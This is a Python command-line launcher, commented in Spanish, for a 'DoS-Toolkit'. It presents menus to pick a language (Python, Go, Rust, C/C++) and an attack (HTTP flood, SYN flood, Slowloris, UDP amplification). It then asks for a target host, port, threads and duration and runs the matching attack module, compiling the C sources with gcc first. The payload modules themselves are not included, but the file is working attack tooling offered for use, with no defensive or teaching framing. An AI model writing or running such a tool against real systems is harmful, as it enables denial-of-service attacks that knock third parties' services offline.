#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DoS-Toolkit CLI Principal
Menú central para ejecutar ataques DoS multi-lenguaje
"""

import os
import sys
import subprocess
import platform
from pathlib import Path

class DoSToolkitCLI:
    def __init__(self):
        self.base_path = Path(__file__).parent
        self.languages = {
            '1': {'name': 'Python', 'path': 'python', 'cmd': 'python'},
            '2': {'name': 'Go', 'path': 'go', 'cmd': 'go'},
            '3': {'name': 'Rust', 'path': 'rust', 'cmd': 'cargo'},
            '4': {'name': 'C/C++', 'path': 'c_cpp', 'cmd': 'gcc'}
        }
        self.attacks = {
            '1': 'HTTP-Flood',
            '2': 'SYN-Flood',
            '3': 'Slowloris',
            '4': 'UDP-Amplification',
            '5': 'Proxy-Utils'
        }
        self.os_type = platform.system()

    def clear_screen(self):
        """Limpia la pantalla según el SO"""
        os.system('cls' if self.os_type == 'Windows' else 'clear')

    def print_banner(self):
        """Imprime el banner del toolkit"""
        banner = """
╔════════════════════════════════════════════════════════════════╗
║                    DoS-TOOLKIT v1.0                           ║
║              Multi-Language Denial of Service                 ║
║                                                                ║
║  Python | Go | Rust | C/C++                                   ║
╚════════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def print_menu_principal(self):
        """Menú principal de selección de lenguaje"""
        self.clear_screen()
        self.print_banner()
        print("\n[*] Selecciona el lenguaje de ejecución:\n")
        for key, lang in self.languages.items():
            print(f"    {key}. {lang['name']}")
        print("    0. Salir\n")

    def print_menu_ataques(self, lenguaje):
        """Menú de selección de tipo de ataque"""
        self.clear_screen()
        self.print_banner()
        print(f"\n[*] Ataques disponibles en {lenguaje}:\n")
        for key, attack in self.attacks.items():
            print(f"    {key}. {attack}")
        print("    0. Volver\n")

    def get_target_info(self, attack_type):
        """Obtiene información del objetivo según el tipo de ataque"""
        print(f"\n[*] Configurando {attack_type}...\n")
        
        target = input("    [?] IP/Dominio objetivo: ").strip()
        if not target:
            print("    [!] Error: Debes ingresar un objetivo")
            return None

        puerto = input("    [?] Puerto (default 80): ").strip()
        puerto = puerto if puerto else "80"

        threads = input("    [?] Número de threads (default 100): ").strip()
        threads = threads if threads else "100"

        duracion = input("    [?] Duración en segundos (default 60): ").strip()
        duracion = duracion if duracion else "60"

        return {
            'target': target,
            'puerto': puerto,
            'threads': threads,
            'duracion': duracion
        }

    def execute_python_attack(self, attack_type, config):
        """Ejecuta ataque en Python"""
        try:
            python_path = self.base_path / 'python' / 'attacks.py'
            cmd = [
                sys.executable,
                str(python_path),
                '--attack', attack_type.lower().replace('-', '_'),
                '--target', config['target'],
                '--port', config['puerto'],
                '--threads', config['threads'],
                '--duration', config['duracion']
            ]
            
            print(f"\n[*] Ejecutando: {' '.join(cmd)}\n")
            subprocess.run(cmd, check=True)
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Error al ejecutar ataque: {e}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def execute_go_attack(self, attack_type, config):
        """Ejecuta ataque en Go"""
        try:
            go_path = self.base_path / 'go'
            cmd = [
                'go', 'run', 'attacks.go',
                '--attack', attack_type.lower().replace('-', '_'),
                '--target', config['target'],
                '--port', config['puerto'],
                '--threads', config['threads'],
                '--duration', config['duracion']
            ]
            
            print(f"\n[*] Ejecutando desde {go_path}...\n")
            subprocess.run(cmd, cwd=str(go_path), check=True)
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Error al ejecutar ataque Go: {e}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def execute_rust_attack(self, attack_type, config):
        """Ejecuta ataque en Rust"""
        try:
            rust_path = self.base_path / 'rust'
            cmd = [
                'cargo', 'run', '--release', '--',
                '--attack', attack_type.lower().replace('-', '_'),
                '--target', config['target'],
                '--port', config['puerto'],
                '--threads', config['threads'],
                '--duration', config['duracion']
            ]
            
            print(f"\n[*] Compilando y ejecutando Rust...\n")
            subprocess.run(cmd, cwd=str(rust_path), check=True)
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Error al ejecutar ataque Rust: {e}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def execute_cpp_attack(self, attack_type, config):
        """Ejecuta ataque en C/C++"""
        try:
            cpp_path = self.base_path / 'c_cpp'
            
            # Mapeo de ataques a archivos
            attack_map = {
                'http_flood': 'http_flood.c',
                'syn_flood': 'syn_flood.c',
                'slowloris': 'slowloris.c',
                'udp_amplification': 'udp_amp.c'
            }
            
            source_file = attack_map.get(attack_type.lower().replace('-', '_'))
            if not source_file:
                print(f"[!] Ataque no disponible en C/C++")
                return
            
            executable = source_file.replace('.c', '')
            
            # Compilar
            compile_cmd = ['gcc', '-o', executable, source_file, '-lpthread']
            print(f"[*] Compilando {source_file}...\n")
            subprocess.run(compile_cmd, cwd=str(cpp_path), check=True)
            
            # Ejecutar
            run_cmd = [f'./{executable}', config['target'], config['puerto'], 
                      config['threads'], config['duracion']]
            print(f"[*] Ejecutando {executable}...\n")
            subprocess.run(run_cmd, cwd=str(cpp_path), check=True)
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Error al compilar/ejecutar C/C++: {e}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def run_attack(self, language_key, attack_key):
        """Ejecuta el ataque seleccionado"""
        if attack_key not in self.attacks:
            print("[!] Opción inválida")
            return

        attack_type = self.attacks[attack_key]
        
        # Obtener información del objetivo
        config = self.get_target_info(attack_type)
        if not config:
            return

        # Confirmar antes de ejecutar
        print(f"\n[!] ADVERTENCIA: Vas a ejecutar {attack_type} contra {config['target']}")
        confirm = input("    ¿Continuar? (s/n): ").strip().lower()
        if confirm != 's':
            print("    [*] Operación cancelada")
            return

        # Ejecutar según lenguaje
        language = self.languages[language_key]
        print(f"\n[*] Ejecutando en {language['name']}...")

        if language_key == '1':
            self.execute_python_attack(attack_type, config)
        elif language_key == '2':
            self.execute_go_attack(attack_type, config)
        elif language_key == '3':
            self.execute_rust_attack(attack_type, config)
        elif language_key == '4':
            self.execute_cpp_attack(attack_type, config)

        input("\n[*] Presiona Enter para continuar...")

    def run(self):
        """Loop principal del CLI"""
        while True:
            self.print_menu_principal()
            choice = input("    [?] Selecciona una opción: ").strip()

            if choice == '0':
                print("\n[*] ¡Hasta luego!\n")
                sys.exit(0)

            if choice not in self.languages:
                print("[!] Opción inválida")
                input("Presiona Enter para continuar...")
                continue

            language = self.languages[choice]
            
            while True:
                self.print_menu_ataques(language['name'])
                attack_choice = input("    [?] Selecciona un ataque: ").strip()

                if attack_choice == '0':
                    break

                if attack_choice not in self.attacks:
                    print("[!] Opción inválida")
                    input("Presiona Enter para continuar...")
                    continue

                self.run_attack(choice, attack_choice)


def main():
    """Punto de entrada principal"""
    try:
        cli = DoSToolkitCLI()
        cli.run()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupción del usuario. Saliendo...\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error fatal: {e}\n")
        sys.exit(1)


if __name__ == '__main__':
    main()
